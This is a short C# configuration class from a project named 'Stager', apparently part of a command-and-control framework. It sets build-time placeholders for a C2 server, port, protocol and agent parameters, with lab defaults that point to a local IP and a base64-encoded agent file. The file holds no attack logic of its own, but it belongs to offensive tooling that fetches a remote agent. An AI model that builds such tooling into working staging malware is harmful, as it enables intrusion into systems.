using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Stager
{
    public class Config
    {
#if C2BUILD
        public const string Protocol = "##PROTOCOL##";
        public const string Server = "##SERVER##";
        public const int Port = ##PORT##;
        public const string FileName = "##FILENAME##";

        public const string AgentParams = "##PARAMS##";
#else
        public const string Protocol = "http";
        public const string Server = "192.168.56.102";
        public const int Port = 80;
        public const string FileName = "agent.b64";

        public const string AgentParams = "https:192.168.56.102:443";
#endif

    }
}
